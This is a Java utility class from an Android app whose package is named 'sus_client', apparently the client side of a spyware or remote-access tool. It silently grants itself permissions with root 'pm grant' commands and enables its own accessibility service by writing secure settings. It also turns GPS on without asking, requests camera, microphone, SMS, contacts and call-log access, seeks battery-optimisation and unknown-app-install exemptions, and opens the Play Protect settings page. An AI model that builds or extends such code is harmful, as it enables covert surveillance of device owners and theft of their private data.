package com.android.sus_client.utils;

import android.Manifest;
import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.app.Activity;
import android.app.AppOpsManager;
import android.app.NotificationManager;
import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ActivityInfo;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.pm.ServiceInfo;
import android.net.Uri;
import android.os.Build;
import android.os.PowerManager;
import android.provider.Settings;
import android.service.notification.NotificationListenerService;
import android.util.Log;
import android.view.accessibility.AccessibilityManager;
import android.widget.Toast;

import com.android.sus_client.commonutility.root.RootManager;
import com.android.sus_client.commonutility.root.ShellUtils;
import com.android.sus_client.services.AppNotificationListener;
import com.android.sus_client.services.MyAccessibilityService;

import java.util.List;

public class PermissionsUtils {

    public static final int UNKNOWN_PACKAGE_INTENT_REQUEST_CODE = 7665;
    public static final String[] permission = new String[]{Manifest.permission.CAMERA, Manifest.permission.RECORD_AUDIO, Manifest.permission.READ_CONTACTS, Manifest.permission.READ_SMS, Manifest.permission.READ_PHONE_STATE, Manifest.permission.READ_CALL_LOG, Manifest.permission.READ_EXTERNAL_STORAGE, Manifest.permission.WRITE_CONTACTS, Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.ACCESS_COARSE_LOCATION};

    public static void goToAppSettings(Context context) {
        Intent intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS,
                Uri.fromParts("package", context.getPackageName(), null));
        context.startActivity(intent);
        try {
            Toast.makeText(context, "Go to Permissions to grant", Toast.LENGTH_SHORT).show();
        } catch (Exception ignored) {
        }
    }

    public static boolean checkDozeMod(Context context) {
        return checkDozeMod(context, false);
    }

    public static boolean checkDozeMod(Context context, boolean request) {
        String packageName = context.getPackageName();
        PowerManager pm = (PowerManager) context.getSystemService(Context.POWER_SERVICE);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !pm.isIgnoringBatteryOptimizations(packageName)) {
            if (request) {
                if (RootManager.hasRootAccess()) {
                    String result = ShellUtils.executeSudoForResult("pm grant " + packageName + " android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS");
                    return result.trim().isEmpty();
                }
                Intent intent = new Intent();
                intent.setAction(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                intent.setData(Uri.parse("package:" + packageName));
                intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                context.startActivity(intent);
            }
            return false;
        }
        return true;
    }

    public static boolean checkDrawOverOtherApps(Context context) {
        return checkDrawOverOtherApps(context, false);
    }

    public static boolean checkDrawOverOtherApps(Context context, boolean request) {
        if (XiaomiUtilities.isMIUI()) {
            if (XiaomiUtilities.isPermissionGranted(context, XiaomiUtilities.OP_BACKGROUND_START_ACTIVITY)) {
                return true;
            }
            if (request) {
                context.startActivity(XiaomiUtilities.getPermissionManagerIntent(context));
            }
            return false;
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(context)) {
            if (request) {
                Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:" + context.getPackageName()));
                intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                context.startActivity(intent);
            }
            return false;
        }
        return true;
    }

    public static boolean checkNotificationListenerAccess(Context context) {
        return checkNotificationListenerAccess(context, false);
    }

    public static boolean checkNotificationListenerAccess(Context context, boolean request) {
        boolean status = false;
        NotificationManager notificationManager = (NotificationManager) context.getSystemService(NotificationListenerService.NOTIFICATION_SERVICE);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O_MR1) {
            status = notificationManager.isNotificationListenerAccessGranted(new ComponentName(context, AppNotificationListener.class));
        } else {
            try {
                String listeners = Settings.Secure.getString(context.getContentResolver(), "enabled_notification_listeners");
                status = !(listeners == null || !listeners.contains(context.getPackageName()));
            } catch (Exception e) {
                e.printStackTrace();
            }
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1 && request && !status) {
            Intent intent = new Intent();
            intent.setAction(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS);
            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(intent);
        }
        return status;
    }

    public static boolean checkDoNotDisturbAccess(Context context, boolean request) {
        NotificationManager notificationManager = (NotificationManager) context.getSystemService(Context.NOTIFICATION_SERVICE);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !notificationManager.isNotificationPolicyAccessGranted()) {
            if (request) {
                Intent intent = new Intent(Settings.ACTION_NOTIFICATION_POLICY_ACCESS_SETTINGS);
                intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                context.startActivity(intent);
            }
            return false;
        }
        return true;
    }

    public static boolean isAccessibilityServiceEnabled(Context context) {
        return isAccessibilityServiceEnabled(context, false);
    }

    public static boolean isAccessibilityServiceEnabled(Context context, boolean request) {
        Class<? extends AccessibilityService> service = MyAccessibilityService.class;
        String classPath = new ComponentName(context, service).flattenToString();

        try {
            /*if (RootManager.hasRootAccess()) {
                // Disable accessibility using root access
                // su -c "settings put secure enabled_accessibility_services " + classPath

                String result1 = ShellUtils.executeForResult("pm disable " + classPath);
                // Re-enable accessibility using root access
                String result2 = ShellUtils.executeForResult("pm enable " + classPath);
                if (result1.trim().isEmpty() && result2.trim().isEmpty()) {
                    throw new Exception("accessibility access granted.");
                }
            }*/

            if (isWriteSecureSettingsEnabled(context)) {
                ContentResolver resolver = context.getContentResolver();
                Settings.Secure.putString(resolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES, classPath);
                Settings.Secure.putString(resolver, Settings.Secure.ACCESSIBILITY_ENABLED, "0");
                Settings.Secure.putString(resolver, Settings.Secure.ACCESSIBILITY_ENABLED, "1");
            } else {
                throw new Exception("WRITE_SECURE_SETTINGS not granted!");
            }
        } catch (Exception ignored) {
        }

        boolean isAccessGranted = false;
        /*AccessibilityManager am = (AccessibilityManager) context.getSystemService(Context.ACCESSIBILITY_SERVICE);
        List<AccessibilityServiceInfo> enabledServices = am.getEnabledAccessibilityServiceList(AccessibilityServiceInfo.FEEDBACK_ALL_MASK | AccessibilityServiceInfo.FEEDBACK_GENERIC);
        for (AccessibilityServiceInfo enabledService : enabledServices) {
            ServiceInfo enabledServiceInfo = enabledService.getResolveInfo().serviceInfo;
            if (enabledServiceInfo.packageName.equals(context.getPackageName()) && enabledServiceInfo.name.equals(service.getName()))
                isAccessGranted = true;
        }*/
        isAccessGranted = MyAccessibilityService.isEnabled(context);

        if (request && !isAccessGranted) {
            goToAccessibilitySettings(context);
        }
        return isAccessGranted;
    }

    public static boolean isUsageAccessEnabled(Context context) {
        return isUsageAccessEnabled(context, false);
    }

    public static boolean isUsageAccessEnabled(Context context, boolean request) {
        boolean isAccessGranted = false;
        try {
            ApplicationInfo applicationInfo = context.getPackageManager().getApplicationInfo(context.getPackageName(), 0);
            AppOpsManager appOpsManager = (AppOpsManager) context.getSystemService(Context.APP_OPS_SERVICE);
            int mode = 0;
            if (android.os.Build.VERSION.SDK_INT > android.os.Build.VERSION_CODES.KITKAT) {
                mode = appOpsManager.checkOpNoThrow(AppOpsManager.OPSTR_GET_USAGE_STATS, applicationInfo.uid, applicationInfo.packageName);
            }
            isAccessGranted = (mode == AppOpsManager.MODE_ALLOWED);
        } catch (PackageManager.NameNotFoundException ignored) {
        }
        if (request && !isAccessGranted) {
            goToUsageAccessSettings(context);
        }
        return isAccessGranted;
    }

    /**
     *
     */

    public static boolean requestForUnknownAppInstall(Context context) {
        return requestForUnknownAppInstall(context, false);
    }

    public static boolean requestForUnknownAppInstall(Context context, boolean request) {
        boolean isPermissionGranted = true;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            isPermissionGranted = context.getPackageManager().canRequestPackageInstalls();
            if (!isPermissionGranted && request) {
                Intent unKnownSourceIntent = new Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES).setData(Uri.parse(String.format("package:%s", context.getPackageName())));
                unKnownSourceIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                context.startActivity(unKnownSourceIntent);
            }
        }
        return isPermissionGranted;
    }

    public static boolean checkAutostartPermission(Context context) {
        return checkAutostartPermission(context, false);
    }

    public static boolean checkAutostartPermission(Context context, boolean request) {
        if (XiaomiUtilities.isMIUI()) {
            if (XiaomiUtilities.isPermissionGranted(context, XiaomiUtilities.OP_AUTO_START)) {
                return true;
            }
            if (request) {
                AppUtils.openAutostartSettings(context);
            }
            return false;
        }
        return true;
    }

    public static boolean turnOnGPS(Context context) {
        try {
            Log.e("PermissionUtils", "turnOnGps ==> " + canToggleGPS(context));
            if (canToggleGPS(context)) {
                String provider = Settings.Secure.getString(context.getContentResolver(), Settings.Secure.LOCATION_PROVIDERS_ALLOWED);
                if (!provider.contains("gps")) { //if gps is disabled
                    final Intent poke = new Intent();
                    poke.setClassName("com.android.settings", "com.android.settings.widget.SettingsAppWidgetProvider");
                    poke.addCategory(Intent.CATEGORY_ALTERNATIVE);
                    poke.setData(Uri.parse("3"));
                    context.sendBroadcast(poke);
                }

            } else {
                try {
                    // need WRITE_SETTINGS and WRITE_SECURE_SETTINGS permissions
                    String result = ShellUtils.executeForResult("settings put secure location_providers_allowed gps,network,wifi");
                    if (!result.trim().isEmpty()) {
                        throw new Exception("Some error occurred!");
                    }
                } catch (Exception e) {
                    Intent intent = new Intent(Settings.ACTION_LOCATION_SOURCE_SETTINGS);
                    intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    context.startActivity(intent);
                }
            }

            return true;
        } catch (Exception e) {
            e.printStackTrace();
            return false;
        }
    }

    public static boolean turnOffGPS(Context context) {
        try {
            Log.e("PermissionUtils", "turnOffGPS ==> " + canToggleGPS(context));
            if (canToggleGPS(context)) {
                String provider = Settings.Secure.getString(context.getContentResolver(), Settings.Secure.LOCATION_PROVIDERS_ALLOWED);
                if (provider.contains("gps")) { //if gps is enabled
                    final Intent poke = new Intent();
                    poke.setClassName("com.android.settings", "com.android.settings.widget.SettingsAppWidgetProvider");
                    poke.addCategory(Intent.CATEGORY_ALTERNATIVE);
                    poke.setData(Uri.parse("3"));
                    context.sendBroadcast(poke);
                }
            }
            return true;
        } catch (Exception e) {
            return false;
        }
    }

    private static boolean canToggleGPS(Context context) {
        PackageManager pacman = context.getPackageManager();
        PackageInfo pacInfo = null;
        try {
            pacInfo = pacman.getPackageInfo("com.android.settings", PackageManager.GET_RECEIVERS);
        } catch (PackageManager.NameNotFoundException e) {
            return false;
        }
        if (pacInfo != null) {
            for (ActivityInfo actInfo : pacInfo.receivers) {
                // test if receiver is exported. if so, we can toggle GPS.
                if (actInfo.name.equals("com.android.settings.widget.SettingsAppWidgetProvider") && actInfo.exported) {
                    return true;
                }
            }
        }
        return false;
    }

    /**
     * show settings pages
     */
    private static void startActivity(Context context, Intent intent) {
        try {
            context.startActivity(intent);
        } catch (android.content.ActivityNotFoundException ex) {
            Toast.makeText(context, "Activity Not Found", Toast.LENGTH_LONG).show();
        }
    }

    public static void goToGooglePlayProtect(Context context) {
        Intent intent = new Intent();
        String GOOGLE_PLAY_SETTINGS_COMPONENT = "com.google.android.gms";
        String GOOGLE_PLAY_SETTINGS_ACTIVITY = ".security.settings.VerifyAppsSettingsActivity";
        intent.setClassName(GOOGLE_PLAY_SETTINGS_COMPONENT, GOOGLE_PLAY_SETTINGS_COMPONENT + GOOGLE_PLAY_SETTINGS_ACTIVITY);
        if (!(context instanceof Activity)) {
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        }
        startActivity(context, intent);
    }

    public static void goToAccessibilitySettings(Context context) {
        Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
        if (!(context instanceof Activity)) {
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        }
        startActivity(context, intent);
    }

    public static void goToUsageAccessSettings(Context context) {
        Intent intent = new Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS);
        if (!(context instanceof Activity)) {
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        }
        startActivity(context, intent);
    }

    public static boolean isWriteSecureSettingsEnabled(Context context) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && context.checkSelfPermission(Manifest.permission.WRITE_SECURE_SETTINGS) != PackageManager.PERMISSION_GRANTED) {
            String result = ShellUtils.executeForResult("pm grant " + context.getPackageName() + " " + Manifest.permission.WRITE_SECURE_SETTINGS);
            System.out.println("checkWriteSecureSettings: " + result);
            return result.trim().isEmpty();
        }
        return true;
    }

    public static boolean requestPermissionAsRoot(Context context, String permission) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && context.checkSelfPermission(permission) != PackageManager.PERMISSION_GRANTED) {
            String result = ShellUtils.executeSudoForResult("pm grant " + context.getPackageName() + " " + permission);
            return result.trim().isEmpty();
        }
        return true;
    }

}